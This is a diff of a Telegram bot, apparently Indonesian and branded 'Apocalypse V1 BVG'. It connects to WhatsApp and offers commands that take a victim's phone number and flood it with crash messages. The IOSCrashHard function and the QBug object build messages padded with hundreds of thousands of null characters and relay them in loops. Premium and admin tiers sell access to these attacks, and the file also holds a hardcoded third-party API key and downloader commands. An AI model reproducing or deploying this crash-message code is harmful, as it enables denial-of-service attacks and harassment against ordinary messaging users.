+      const user = await ctx.telegram.getChat(userId);
+      removeAdmin(userId);
+
+      const successMessage = `
+┏━━━━[ 𝗗𝗘𝗟𝗘𝗧𝗘 𝗔𝗗𝗠𝗜𝗡 ]━━━━
+┃
+┃ ✅ Berhasil menghapus Admin!
+┃
+┃ 𝗗𝗲𝘁𝗮𝗶𝗹 𝗨𝘀𝗲𝗿:
+┃ • ID: ${userId}
+┃ • Username: ${user.username ? '@' + user.username : 'Tidak ada'}
+┃ • Nama: ${user.first_name}${user.last_name ? ' ' + user.last_name : ''}
+┃
+┃ User tersebut tidak lagi memiliki
+┃ akses ke fitur admin.
+┗━━━━━━━━━━━━━━━━━━━━`;
+
+      await ctx.replyWithMarkdown(successMessage, {
+          reply_markup: {
+              inline_keyboard: [
+                  [{ text: "📋 List Admin", callback_data: "listadmin" }],
+                  [{ text: "❌ Close", callback_data: "close" }]
+              ]
+          }
+      });
+  } catch (error) {
+      console.error('Error removing admin:', error);
+      await ctx.reply("❌ Gagal menghapus admin. Pastikan ID/Username valid.");
+  }
+});
+
+// Delete Owner Command
+bot.command("delowner", async (ctx) => {
+  if (!OWNER_ID(ctx.from.id)) {
+      return await ctx.reply("❌ Sorry, you don't have access to use this command.");
+  }
+
+  let userId;
+
+  if (ctx.message.reply_to_message) {
+      userId = ctx.message.reply_to_message.from.id.toString();
+  } else {
+      const args = ctx.message.text.split(" ")[1];
+      if (!args) {
+          return await ctx.reply(`❌ Format salah! Gunakan:
+• Reply pesan: /delowner
+• Username: /delowner @username
+• ID: /delowner 123456789`);
+      }
+
+      if (args.startsWith("@")) {
+          try {
+              const username = args.slice(1);
+              const chatMember = await ctx.telegram.getChatMember(ctx.chat.id, `@${username}`);
+              userId = chatMember.user.id.toString();
+          } catch (error) {
+              return await ctx.reply("❌ Username tidak ditemukan atau bukan member dari grup ini.");
+          }
+      } else {
+          if (!/^\d+$/.test(args)) {
+              return await ctx.reply("❌ ID harus berupa angka!");
+          }
+          userId = args;
+      }
+  }
+
+  if (!ownerList.includes(userId)) {
+      return await ctx.reply(`❌ User dengan ID ${userId} tidak terdaftar sebagai owner.`);
+  }
+
+  try {
+      const user = await ctx.telegram.getChat(userId);
+      ownerList = ownerList.filter(id => id !== userId);
+      await saveOwnerList();
+
+      const successMessage = `
+┏━━━━[ 𝗗𝗘𝗟𝗘𝗧𝗘 𝗢𝗪𝗡𝗘𝗥 ]━━━━
+┃
+┃ ✅ Berhasil menghapus Owner!
+┃
+┃ 𝗗𝗲𝘁𝗮𝗶𝗹 𝗨𝘀𝗲𝗿:
+┃ • ID: ${userId}
+┃ • Username: ${user.username ? '@' + user.username : 'Tidak ada'}
+┃ • Nama: ${user.first_name}${user.last_name ? ' ' + user.last_name : ''}
+┃
+┃ User tersebut tidak lagi memiliki
+┃ akses ke fitur owner.
+┗━━━━━━━━━━━━━━━━━━━━`;
+
+      await ctx.replyWithMarkdown(successMessage, {
+          reply_markup: {
+              inline_keyboard: [
+                  [{ text: "📋 List Owner", callback_data: "listowner" }],
+                  [{ text: "❌ Close", callback_data: "close" }]
+              ]
+          }
+      });
+  } catch (error) {
+      console.error('Error removing owner:', error);
+      await ctx.reply("❌ Gagal menghapus owner. Pastikan ID/Username valid.");
+  }
+});
+
+// Handler untuk callback listadmin
+bot.action("listadmin", async (ctx) => {
+  try {
+      let adminText = "┏━━━━[ 𝗟𝗜𝗦𝗧 𝗔𝗗𝗠𝗜𝗡 ]━━━━\n┃\n";
+      
+      for (const adminId of adminList) {
+          try {
+              const user = await ctx.telegram.getChat(adminId);
+              adminText += `┃ • ${user.first_name}${user.last_name ? ' ' + user.last_name : ''}\n`;
+              adminText += `┃   ID: ${adminId}\n`;
+              if (user.username) adminText += `┃   Username: @${user.username}\n`;
+              adminText += "┃\n";
+          } catch (error) {
+              adminText += `┃ • ID: ${adminId} (User tidak ditemukan)\n┃\n`;
+          }
+      }
+      
+      adminText += `┃ Total: ${adminList.length} admin\n`;
+      adminText += "┗━━━━━━━━━━━━━━━━━━━━";
+
+      await ctx.editMessageText(adminText, {
+          reply_markup: {
+              inline_keyboard: [[{ text: "❌ Close", callback_data: "close" }]]
+          }
+      });
+  } catch (error) {
+      console.error('Error displaying admin list:', error);
+      await ctx.answerCallbackQuery("❌ Gagal menampilkan daftar admin.");
+  }
+});
+
+// Command /addprem - Menambahkan user premium
+bot.command("addprem", async (ctx) => {
+    if (!OWNER_ID(ctx.from.id) && !isOwner(ctx.from.id) && !isAdmin(ctx.from.id)) {
+        return await ctx.reply("❌ Sorry, you don't have access to use this command.");
+    }
+
+    const args = ctx.message.text.split(" ");
+    let userId;
+    let durationDays;
+
+    // Parse durasi dari argument terakhir
+    durationDays = parseInt(args[args.length - 1]);
+    if (isNaN(durationDays) || durationDays <= 0) {
+        return await ctx.reply(`❌ Format salah! Gunakan:
+- Reply pesan: /addprem <durasi_hari>
+- Username: /addprem @username <durasi_hari>
+- ID: /addprem 123456789 <durasi_hari>
+
+Contoh: /addprem @username 30`);
+    }
+
+    // Jika command merupakan reply ke pesan
+    if (ctx.message.reply_to_message) {
+        userId = ctx.message.reply_to_message.from.id.toString();
+    } 
+    // Jika ada username/mention atau ID yang diberikan
+    else if (args.length >= 3) {
+        const userArg = args[1];
+        
+        // Jika input adalah username (dimulai dengan @)
+        if (userArg.startsWith("@")) {
+            try {
+                const username = userArg.slice(1);
+                const chatMember = await ctx.telegram.getChatMember(ctx.chat.id, `@${username}`);
+                userId = chatMember.user.id.toString();
+            } catch (error) {
+                console.log("Error getting user by username:", error);
+                userId = null;
+            }
+        } 
+        // Jika input adalah ID langsung
+        else {
+            userId = userArg.toString();
+        }
+    }
+
+    if (!userId) {
+        return await ctx.reply("❌ Tidak dapat menemukan user. Pastikan ID/Username valid.");
+    }
+
+    try {
+        // Tambahkan user ke premium
+        addPremiumUser(userId, durationDays);
+
+        const expirationDate = premiumUsers[userId].expired;
+        const formattedExpiration = moment(expirationDate, 'YYYY-MM-DD HH:mm:ss').tz('Asia/Jakarta').format('DD-MM-YYYY HH:mm:ss');
+
+        const successMessage = `
+┏━━━━[ 𝗔𝗗𝗗 𝗣𝗥𝗘𝗠𝗜𝗨𝗠 ]━━━━
+┃
+┃ ✅ Berhasil menambahkan Premium!
+┃
+┃ 𝗗𝗲𝘁𝗮𝗶𝗹 𝗣𝗿𝗲𝗺𝗶𝘂𝗺:
+┃ • ID: ${userId}
+┃ • Durasi: ${durationDays} hari
+┃ • Expired: ${formattedExpiration} WIB
+┃
+┃ Terima kasih telah bergabung
+┃ dengan komunitas premium! 🌟
+┗━━━━━━━━━━━━━━━━━━━━`;
+
+        await ctx.replyWithMarkdown(successMessage, {
+            reply_markup: {
+                inline_keyboard: [
+                    [{ text: "📋 List Premium", callback_data: "listprem" }],
+                    [{ text: "🔍 Cek Status", callback_data: `cekprem_${userId}` }],
+                    [{ text: "❌ Close", callback_data: "close" }]
+                ]
+            }
+        });
+
+    } catch (error) {
+        console.error('Error adding premium:', error);
+        await ctx.reply("❌ Gagal menambahkan premium. Silakan coba lagi.");
+    }
+});
+
+// Handler untuk callback listprem
+bot.action("listprem", async (ctx) => {
+  try {
+      let premText = `╭═══❲ 𝗣𝗥𝗘𝗠𝗜𝗨𝗠 𝗟𝗜𝗦𝗧 ❳═══⊱\n┃\n`;
+      
+      for (const [userId, userData] of Object.entries(premiumUsers)) {
+          try {
+              const user = await ctx.telegram.getChat(userId);
+              const expiry = moment(userData.expired).tz('Asia/Jakarta');
+              const timeLeft = expiry.fromNow();
+              
+              premText += `┃ ⬡ ${user.first_name}\n`;
+              premText += `┃    ${timeLeft}\n`;
+          } catch (error) {
+              premText += `┃ ⬡ Unknown User\n`;
+              premText += `┃    ID: ${userId}\n`;
+          }
+      }
+      
+      premText += `┃\n┃ Total: ${Object.keys(premiumUsers).length} Premium\n`;
+      premText += `╰═════════════════⊱\n`;
+      premText += `           *APOCALYPSE V1 BVG  @haunteddevv*`;
+
+      await ctx.editMessageText(premText, {
+          parse_mode: "Markdown",
+          reply_markup: {
+              inline_keyboard: [
+                  [{ text: "〆 Close", callback_data: "close" }]
+              ]
+          }
+      });
+  } catch (error) {
+      console.error('Error displaying premium list:', error);
+      await ctx.answerCallbackQuery("❌ Gagal menampilkan daftar premium.");
+  }
+});
+
+
+
+// Callback Query untuk Menampilkan Status Premium
+bot.action(/cekprem_(.+)/, async (ctx) => {
+    const userId = ctx.match[1];
+    if (userId !== ctx.from.id.toString() && !OWNER_ID(ctx.from.id) && !isOwner(ctx.from.id) && !isAdmin(ctx.from.id)) {
+        return await ctx.answerCbQuery("❌ Anda tidak memiliki akses untuk mengecek status premium user lain.");
+    }
+
+    if (!premiumUsers[userId]) {
+        return await ctx.answerCbQuery(`❌ User dengan ID ${userId} tidak terdaftar sebagai user premium.`);
+    }
+
+    const expirationDate = premiumUsers[userId].expired;
+    const formattedExpiration = moment(expirationDate, 'YYYY-MM-DD HH:mm:ss').tz('Asia/Jakarta').format('DD-MM-YYYY HH:mm:ss');
+    const timeLeft = moment(expirationDate, 'YYYY-MM-DD HH:mm:ss').tz('Asia/Jakarta').fromNow();
+
+    const message = `
+ℹ️ Status Premium User *${userId}*
+
+*Detail:*
+- *ID User:* ${userId}
+- *Kadaluarsa:* ${formattedExpiration} WIB
+- *Sisa Waktu:* ${timeLeft}
+
+Terima kasih telah menjadi bagian dari komunitas premium kami!
+    `;
+
+    await ctx.answerCbQuery();
+    await ctx.replyWithMarkdown(message);
+});
+
+// --- Command /cekusersc ---
+bot.command("cekusersc", async (ctx) => {
+    const totalDevices = deviceList.length;
+    const deviceMessage = `
+ℹ️ Saat ini terdapat *${totalDevices} device* yang terhubung dengan script ini.
+    `;
+
+    await ctx.replyWithMarkdown(deviceMessage);
+});
+
+// --- Command /monitoruser ---
+bot.command("monitoruser", async (ctx) => {
+    if (!OWNER_ID(ctx.from.id) && !isOwner(ctx.from.id)) {
+        return await ctx.reply("❌ Sorry, you don't have access to use this command.");
+    }
+
+    let userList = "";
+    for (const userId in userActivity) {
+        const user = userActivity[userId];
+        userList += `
+- *ID:* ${userId}
+ *Nickname:* ${user.nickname}
+ *Terakhir Dilihat:* ${user.last_seen}
+`;
+    }
+
+    const message = `
+👤 *Daftar Pengguna Bot:*
+${userList}
+Total Pengguna: ${Object.keys(userActivity).length}
+    `;
+
+    await ctx.replyWithMarkdown(message);
+});
+
+const prosesrespone = async (target, ctx) => {
+  const caption = `╭═〘 𝐀𝐏𝐎𝐂𝐀𝐋𝐘𝐏𝐒𝐄 𝐁𝐕𝐆 〙═⊱
+┃
+┃ ♨️ 𝐏𝐫𝐨𝐬𝐞𝐬 𝐁𝐮𝐠 𝐁𝐲 𝐀𝐳𝐫𝐚𝐞𝐥
+┃ 
+┃ 𝐓𝐚𝐫𝐠𝐞𝐭 : wa.me/${target.split("@")[0]}
+┃ 𝐌𝐞𝐭𝐡𝐨𝐝 : 𝐀𝐩𝐨𝐜𝐚𝐥𝐲𝐩𝐬𝐞 𝐕1 𝐁𝐯𝐆
+┃ 𝐒𝐭𝐚𝐭𝐮𝐬 : 𝙎𝙚𝙣𝙙𝙞𝙣𝙜...
+┃
+╰═════════════════⊱`;
+
+  try {
+      await ctx.replyWithPhoto("https://cdn.anomaki.web.id/file/1739523183904.jpeg", {
+          caption: caption,
+          parse_mode: "Markdown"
+      });
+      console.log(chalk.blue.bold(`[✓] Process attack started for ${target}`));
+  } catch (error) {
+      console.error(chalk.red.bold('[!] Error sending process response:', error));
+      // Fallback to text-only message if image fails
+      await ctx.reply(caption, { parse_mode: "Markdown" });
+  }
+};
+
+const donerespone = async (target, ctx) => {
+  // Get random hexcolor for timestamp
+  const hexColor = '#' + Math.floor(Math.random()*16777215).toString(16);
+  const timestamp = moment().format('HH:mm:ss');
+  
+  try {
+    // Fetch kata ilham dari API
+    const response = await axios.get('https://api.betabotz.eu.org/api/random/katailham?apikey=Btz-kp72a');
+    const kataIlham = response.data.hasil;
+ 
+    const caption = `╭═〘𝐀𝐏𝐎𝐂𝐀𝐋𝐘𝐏𝐒𝐄 𝐁𝐕𝐆〙═⊱
+ ┃
+ ┃ ✅ 𝙎𝙪𝙘𝙘𝙚𝙨𝙨 𝐁𝐮𝐠 𝐁𝐲 𝐀𝐳𝐫𝐚𝐞𝐥
+ ┃ 
+ ┃ 𝐓𝐚𝐫𝐠𝐞𝐭 : wa.me/${target.split("@")[0]}
+ ┃ 𝐌𝐞𝐭𝐡𝐨𝐝 : 𝐀𝐩𝐨𝐜𝐚𝐥𝐲𝐩𝐬𝐞 𝐕1 𝐁𝐯𝐆
+ ┃ 𝐒𝐭𝐚𝐭𝐮𝐬 : 𝘾𝙤𝙢𝙥𝙡𝙚𝙩𝙚𝙙....
+ ┃ 𝐓𝐢𝐦𝐞 : ${timestamp} WIB
+ ┃
+ ┃ 𝐏𝐞𝐬𝐚𝐧 : ${kataIlham}
+ ┃
+ ╰═════════════════⊱
+        *𝑻𝒉𝒆 𝒘𝒆𝒂𝒌 𝒔𝒉𝒂𝒍𝒍 𝑺𝒖𝒇𝒇𝒆𝒓*`;
+ 
+    await ctx.replyWithPhoto("https://cdn.anomaki.web.id/file/1739523183904.jpeg", {
+        caption: caption,
+        parse_mode: "Markdown",
+        reply_markup: {
+            inline_keyboard: [
+                [{ text: "〆 Close", callback_data: "close" }]
+            ]
+        }
+    });
+    console.log(chalk.green.bold(`[✓] Attack completed for ${target}`));
+  } catch (error) {
+      console.error(chalk.red.bold('[!] Error:', error));
+      // Fallback message tanpa quotes jika API error
+      const fallbackCaption = `╭═〘𝐀𝐏𝐎𝐂𝐀𝐋𝐘𝐏𝐒𝐄 𝐁𝐕𝐆 〙═⊱
+ ┃
+ ┃ ✅ 𝙎𝙪𝙘𝙘𝙚𝙨𝙨 𝐁𝐮𝐠 𝐁𝐲 𝑨𝒛𝒓𝒂𝒆𝒍
+ ┃ 
+ ┃ 𝐓𝐚𝐫𝐠𝐞𝐭 : wa.me/${target.split("@")[0]}
+ ┃ 𝐌𝐞𝐭𝐡𝐨𝐝 : 𝐀𝐩𝐨𝐜𝐚𝐥𝐲𝐩𝐬𝐞 𝐕1 𝐁𝐯𝐆
+ ┃ 𝐒𝐭𝐚𝐭𝐮𝐬 : 𝘾𝙤𝙢𝙥𝙡𝙚𝙩𝙚𝙙....
+ ┃ 𝐓𝐢𝐦𝐞 : ${timestamp} WIB
+ ┃▇▇▇▇▇▇▓▓▓▒▒░▓
+ ╰═════════════════⊱
+        *𝑻𝒉𝒆 𝒘𝒆𝒂𝒌 𝒔𝒉𝒂𝒍𝒍 𝑺𝒖𝒇𝒇𝒆𝒓🕷️*`;
+ 
+      await ctx.reply(fallbackCaption, {
+          parse_mode: "Markdown",
+          reply_markup: {
+              inline_keyboard: [
+                  [{ text: "〆 Close", callback_data: "close" }]
+              ]
+          }
+      });
+  }
+ };
+
+const checkWhatsAppConnection = async (ctx, next) => {
+    if (!isWhatsAppConnected) {
+        await ctx.reply("❌ WhatsApp belum terhubung. Silakan gunakan command /addpairing");
+        return;
+    }
+    await next();
+};
+
+const QBug = {
+  key: {
+    remoteJid: "p",
+    fromMe: false,
+    participant: "0@s.whatsapp.net"
+  },
+  message: {
+    interactiveResponseMessage: {
+      body: {
+        text: "Sent",
+        format: "DEFAULT"
+      },
+      nativeFlowResponseMessage: {
+        name: "galaxy_message",
+        paramsJson: `{\"screen_2_OptIn_0\":true,\"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\"TrashDex Superior\",\"screen_1_DatePicker_1\":\"1028995200000\",\"screen_1_TextInput_2\":\"devorsixcore@trash.lol\",\"screen_1_TextInput_3\":\"94643116\",\"screen_0_TextInput_0\":\"radio - buttons${"\0".repeat(500000)}\",\"screen_0_TextInput_1\":\"Anjay\",\"screen_0_Dropdown_2\":\"001-Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}`,
+        version: 3
+      }
+    }
+  }
+};
+
+bot.use(checkMaintenance); // Middleware untuk mengecek maintenance
+// 
+bot.command("soundcloud", async (ctx) => {
+    const text = ctx.message.text;
+    const args = text.split(" ");
+  
+    if (args.length < 2) {
+      return ctx.reply(`
+  ╭═══[ 𝗦𝗢𝗨𝗡𝗗𝗖𝗟𝗢𝗨𝗗 ]═══⊱
+  ┃
+  ┃ ❌ Format Salah!
+  ┃ 
+  ┃ 𝗣𝗲𝗻𝗴𝗴𝘂𝗻𝗮𝗮𝗻:
+  ┃ /soundcloud url_soundcloud
+  ┃ 𝗖𝗼𝗻𝘁𝗼𝗵:
+  ┃ /soundcloud https://soundcloud.com/xxx
+  ╰═════════════════════⊱`);
+    }
+  
+    const url = args[1];
+    const apiUrl = `https://api.betabotz.eu.org/api/download/soundcloud?url=${url}&apikey=Btz-kp72a`;
+  
+    await ctx.reply(`
+  ╭═══[ 𝗣𝗥𝗢𝗖𝗘𝗦𝗦𝗜𝗡𝗚 𝗔𝗨𝗗𝗜𝗢 ]═══⊱
+   ▏ﮩ٨ـﮩﮩ٨ـ♡ﮩ٨ـﮩﮩ٨ـ▏
+  ┃ ⏳ 𝙎𝙚𝙖𝙧𝙘𝙝𝙞𝙣𝙜 𝙛𝙤𝙧 𝙢𝙪𝙨𝙞𝙘
+  ┃ 𝗨𝗿𝗹: ${url}
+  ╰═════════════════⊱`);
+  
+    try {
+      const response = await axios.get(apiUrl);
+      const data = response.data;
+  
+      if (data.status && data.result) {
+        const audioUrl = data.result.url;
+        const title = data.result.title;
+        const thumbnail = data.result.thumbnail || "https://cdn.anomaki.web.id/file/1739523183904.jpeg";
+  
+        // Kirim thumbnail dengan audio
+        await ctx.replyWithPhoto(thumbnail, {
+          caption: `
+  ╭═══[ 𝗦𝗢𝗨𝗡𝗗𝗖𝗟𝗢𝗨𝗗 ]═══⊱
+  ┃
+  ┃ ✅ Berhasil diunduh!
+  ┃ 𝗝𝘂𝗱𝘂𝗹: ${title}
+  ╰═════════════════⊱`,
+          parse_mode: "Markdown"
+        });
+  
+        // Kirim audio
+        await ctx.replyWithAudio(audioUrl, {
+          title: title,
+          performer: "Apocalypse Downloader",
+          thumb: thumbnail
+        });
+  
+      } else {
+        ctx.reply(`
+  ╭═══[ 𝗘𝗥𝗥𝗢𝗥 ]═══⊱
+  ┃
+  ┃ ❌ Gagal mengunduh musik
+  ┃ 𝗜𝗻𝗳𝗼: URL tidak valid
+  ╰═════════════════⊱`);
+      }
+    } catch (error) {
+      console.error(error);
+      ctx.reply(`
+  ╭═══[ 𝗘𝗥𝗥𝗢𝗥 ]═══⊱
+  ┃
+  ┃ ❌ Terjadi kesalahan
+  ┃ 𝗜𝗻𝗳𝗼: Coba lagi nanti
+  ╰═════════════════⊱`);
+    }
+  });
+
+bot.command("tiktokmp3", async (ctx) => {
+  const text = ctx.message.text;
+  const args = text.split(" ");
+
+  if (args.length < 2) {
+    return ctx.reply(`
+╭═══[ 𝗧𝗜𝗞𝗧𝗢𝗞 𝗗𝗢𝗪𝗡𝗟𝗢𝗔𝗗𝗘𝗥 ]═══⊱
+┃
+┃ ❌ Format Salah!
+┃ 
+┃ 𝗣𝗲𝗻𝗴𝗴𝘂𝗻𝗮𝗮𝗻:
+┃ /tiktokmp3 url_tiktok
+┃ 𝗖𝗼𝗻𝘁𝗼𝗵:
+┃ /tiktokmp3 https://vm.tiktok.com/xxx
+╰═════════════════════⊱`);
+  }
+
+  const videoUrl = args[1];
+  const apiUrl = `https://api.betabotz.eu.org/api/download/tiktok?url=${videoUrl}&apikey=Btz-kp72a`;
+
+  await ctx.reply(`
+╭═══[ 𝗣𝗥𝗢𝗦𝗘𝗦 ]═══⊱
+┃
+┃ ⏳ Mengunduh audio...
+┃ 𝗨𝗿𝗹: ${videoUrl}
+╰═════════════════⊱`);
+
+  try {
+    const response = await axios.get(apiUrl);
+    const data = response.data;
+
+    if (data.status) {
+      const audioUrl = data.result.audio[0];
+      const title = data.result.title;
+
+      await ctx.replyWithAudio(audioUrl, {
+        caption: `
+╭═══[ 𝗧𝗜𝗞𝗧𝗢𝗞 𝗔𝗨𝗗𝗜𝗢 ]═══⊱
+┃
+┃ ✅ Berhasil diunduh! 
+┃ 𝗝𝘂𝗱𝘂𝗹: ${title}
+╰═════════════════⊱`,
+        title: `${title}.mp3`,
+        parse_mode: "Markdown"
+      });
+
+    } else {
+      ctx.reply(`
+╭═══[ 𝗘𝗥𝗥𝗢𝗥 ]═══⊱
+┃
+┃ ❌ Gagal mengunduh audio
+┃ 𝗜𝗻𝗳𝗼: URL tidak valid
+╰═════════════════⊱`);
+    }
+  } catch (error) {
+    console.error(error);
+    ctx.reply(`
+╭═══[ 𝗘𝗥𝗥𝗢𝗥 ]═══⊱
+┃
+┃ ❌ Terjadi kesalahan
+┃ 𝗜𝗻𝗳𝗼: Coba lagi nanti
+╰═════════════════⊱`);
+  }
+});
+
+bot.command("tiktokmp4", async (ctx) => {
+  const text = ctx.message.text;
+  const args = text.split(" ");
+
+  if (args.length < 2) {
+      return await ctx.reply(`
+╭═══[ 𝗧𝗜𝗞𝗧𝗢𝗞 𝗗𝗢𝗪𝗡𝗟𝗢𝗔𝗗𝗘𝗥 ]═══⊱
+┃
+┃ ❌ Format Salah!
+┃ 
+┃ 𝗣𝗲𝗻𝗴𝗴𝘂𝗻𝗮𝗮𝗻:
+┃ /tiktokmp4 url_tiktok
+┃ 𝗖𝗼𝗻𝘁𝗼𝗵:
+┃ /tiktokmp4 https://vm.tiktok.com/xxx
+╰═════════════════════⊱`);
+  }
+
+  const videoUrl = args[1];
+  const apiUrl = `https://api.betabotz.eu.org/api/download/tiktok?url=${videoUrl}&apikey=Btz-kp72a`;
+
+  await ctx.reply(`
+╭═══[ 𝗣𝗥𝗢𝗦𝗘𝗦 ]═══⊱
+┃
+┃ ⏳ Mengunduh video...
+┃ 𝗨𝗿𝗹: ${videoUrl}
+╰═════════════════⊱`);
+
+  try {
+    const response = await axios.get(apiUrl);
+    const data = response.data;
+
+    if (data.status && data.result.video && data.result.video[0]) {
+      const videoUrl = data.result.video[0];
+      const title = data.result.title;
+
+      // Hilangkan karakter khusus dan emoji dari judul
+      const cleanTitle = title.replace(/[^\w\s-]/g, '');
+
+      await ctx.replyWithVideo(videoUrl, {
+        caption: `╭═══[ 𝗧𝗜𝗞𝗧𝗢𝗞 𝗩𝗜𝗗𝗘𝗢 ]═══⊱\n┃\n┃ ✅ Berhasil diunduh!\n┃ \n┃ 𝗝𝘂𝗱𝘂𝗹: ${cleanTitle}\n┃\n╰═════════════════⊱`,
+        parse_mode: undefined // Hapus parse_mode
+      });
+
+    } else {
+      ctx.reply(`
+╭═══[ 𝗘𝗥𝗥𝗢𝗥 ]═══⊱
+┃
+┃ ❌ Gagal mengunduh video
+┃ 𝗜𝗻𝗳𝗼: URL tidak valid
+╰═════════════════⊱`);
+    }
+  } catch (error) {
+    console.error('Error downloading video:', error);
+    ctx.reply(`
+╭═══[ 𝗘𝗥𝗥𝗢𝗥 ]═══⊱
+┃
+┃ ❌ Terjadi kesalahan
+┃ 𝗜𝗻𝗳𝗼: Coba lagi nanti
+╰═════════════════⊱`);
+  }
+});
+
+
+
+
+// --- Command /crash (Placeholder for your actual crash functions) ---
+async function IOSCrashHard(sock, target) {
+  try {
+    // Membuat pesan crash khusus untuk iOS
+    const genIOSCrash = (title, bodyText) => generateWAMessageFromContent(target, proto.Message.fromObject({
+      viewOnceMessage: {
+        message: {
+          interactiveMessage: {
+            header: {
+              title: title,
+              hasMediaAttachment: false
+            },
+            body: {
+              text: bodyText
+            },
+            nativeFlowMessage: {
+              messageParamsJson: JSON.stringify({
+                name: "ios_crash_flow",
+                flow_action: "system_overload",
+                flow_token: "Apocalypse X IOs",
+                version: "1.0.0"
+              }),
+              buttons: [
+                {
+                  name: "call_permission_request",
+                  buttonParamsJson: JSON.stringify({
+                    overload_payload: "\u0000".repeat(500000)
+                  })
+                },
+                {
+                  name: "single_select",
+                  buttonParamsJson: JSON.stringify({
+                    crash_sequence: "\u0000".repeat(750000)
+                  })
+                }
+              ]
+            },
+            contextInfo: {
+              mentionedJid: Array.from({ length: 10 }, () => "1@newsletter"),
+              forwardingScore: 999999,
+              isForwarded: true
+            }
+          }
+        }
+      }
+    }), { userJid: target });
+
+    // Kirim serangkaian pesan crash
+    for (let i = 1; i <= 10; i++) {
+      console.log(chalk.white.bold(`\n[${i}] Mengirim iOS Hard Crash ke ${target}`));
+      
+      const msg = await genIOSCrash(
+        `iOS Crash Payload ${i}`, 
+        "系统崩溃即将开始" + "\u0000".repeat(50000)
+      );
+      
+      await sock.relayMessage(target, msg.message, { 
+        participant: { jid: target, count: 1 },
+        messageId: msg.key.id
+      });
+      
+      // Tambahkan jeda singkat antar pesan
+      await new Promise(resolve => setTimeout(resolve, 500));
+      
+      console.log(chalk.green.bold(`[√] Berhasil mengirim iOS Hard Crash ${i}/10`));
+    }
+
+    // Kirim pesan tambahan untuk memastikan crash
+    const finalCrashMsg = await genIOSCrash(
+      "System Overload", 
+      "🔥 Critical System Failure 🔥" + "\u0000".repeat(750000)
+    );
+    
+    await sock.relayMessage(target, finalCrashMsg.message, { 
+      participant: { jid: target, count: 1 },
+      messageId: finalCrashMsg.key.id
+    });
+
+    console.log(chalk.blue.bold(`\n[*] Semua 10 payload iOS Hard Crash berhasil dikirim ke ${target}`));
+
+  } catch (error) {
+    console.error(chalk.red.bold(`\n[!] Terjadi error pada iOS Hard Crash: ${error}`));
+    throw error;
+  }
+}
+
+
+
+
+bot.command("ndobetav1", checkWhatsAppConnection, async ctx => {
+      const q = ctx.message.text.split(" ")[1];
+  
+      if (!q) {
+          return await ctx.reply(`Example: ndobetav1 62×××`);
+      }
+  
+      let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
+  
+      await prosesrespone(target, ctx);
+  
+      for (let i = 0; i < 6; i++) {
+        await betanewcrash(target, ptcp = true);
+        await sendbugv4(target, ptcp = true);
+      }
+  
+      await donerespone(target, ctx);
+  });
+
+
+bot.command("ndoforcev1", checkWhatsAppConnection, async ctx => {
+  const q = ctx.message.text.split(" ")[1];
+
+  if (!q) {
+      return await ctx.reply(`Example: /ndoforcev1 62×××`);
+  }
+
+  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
+
+  await prosesrespone(target, ctx);
+
+  for (let i = 0; i < 10; i++) {
+    await OverloadCursor(target, ptcp = true);
+}
+
+  await donerespone(target, ctx);
+});
+
+bot.command("ndobetav2", checkWhatsAppConnection, async ctx => {
+  const q = ctx.message.text.split(" ")[1];
+
+  if (!q) {
+      return await ctx.reply(`Example: /ndobetav2 (nomor)`);
+  }
+
+  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
+
+  try {
+      await prosesrespone(target, ctx);
+
+      // Kirim bug secara selang seling
+      for(let i = 0; i < 10; i++) {
+          try {
+              // Kirim DocFc
+              await DocFc(target);
+              console.log(chalk.green.bold(`\n[✓] Berhasil mengirim DocFc ${i+1}/3 ke ${target}`));
+              
+              // Kirim sendCrashBetaNew
+              await betanewcrash(target);
+              console.log(chalk.green.bold(`\n[✓] Berhasil mengirim BetaNew ${i+1}/3 ke ${target}`));
+                   
+          } catch(error) {
+              console.error(chalk.red.bold(`[!] Error pada pengiriman ke-${i+1}:`, error));
+              continue;
+          }
+      }
+
+      await donerespone(target, ctx);
+  } catch (error) {
+      console.error(chalk.red.bold(`[!] Error utama:`, error));
+      await ctx.reply("❌ Terjadi error saat mengirim bug.");
+  }
+});
+
+
+bot.command("ndoiosv1", checkWhatsAppConnection, async ctx => {
+  const q = ctx.message.text.split(" ")[1];
+
+  if (!q) {
+      return await ctx.reply(`Example: /ndoiosv1 62×××`);
+  }
+
+  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
+
+  await prosesrespone(target, ctx);
+
+  try {
+      for (let i = 0; i < 10; i++) {
+          await OverloadCursor(target, true);
+          await NewIos(target, true);
+          console.log(chalk.green.bold(`[✓] Sent Bug Combo ${i+1}/10 to ${target}`));
+      }
+
+      await donerespone(target, ctx);
+  } catch (error) {
+      console.error(chalk.red.bold(`[!] Error in iosv2:`, error));
+      await ctx.reply("❌ Terjadi error saat mengirim bug.");
+  }
+});
+
+bot.command("ndoiosv2", checkWhatsAppConnection, async ctx => {
+    const q = ctx.message.text.split(" ")[1];
+
+    if (!q) {
+        return await ctx.reply(`Example: ndoiosv1 62×××`);
+    }
+
+    let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
+
+    await prosesrespone(target, ctx);
+
+    try {
+        for (let i = 0; i < 8; i++) {
+            await OverloadCursor(target, true);
+            await OverloadCursor(target, true);
+        }
+
+        await donerespone(target, ctx);
+    } catch (error) {
+        console.error(chalk.red.bold('[!] ndoiosv2 command failed:'), error);
+        await ctx.reply("❌ Terjadi error saat mengeksekusi /ndoiosv2. Silakan coba lagi.");
+    }
+});
+bot.command("ndoforcev2", checkWhatsAppConnection, async ctx => {
+  const q = ctx.message.text.split(" ")[1];
+
+  if (!q) {
+      return await ctx.reply(`Example: /ndoforcev2 62×××`);
+  }
+
+  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
+
+  await prosesrespone(target, ctx);
+
+  try {
+      for (let i = 0; i < 5; i++) {
+          await OverloadCursor(target, true);
+          await sleep(200); // Add delay to prevent overwhelming
+          await betanewcrash(target, true);
+          await sleep(200);
+      }
+
+      await donerespone(target, ctx);
+  } catch (error) {
+      console.error(chalk.red.bold('[!] ndoforcev2 command failed:'), error);
+      await ctx.reply("❌ Terjadi error saat mengeksekusi /ndoforcev2. Silakan coba lagi.");
+  }
+});
+
+bot.start(async (ctx) => {
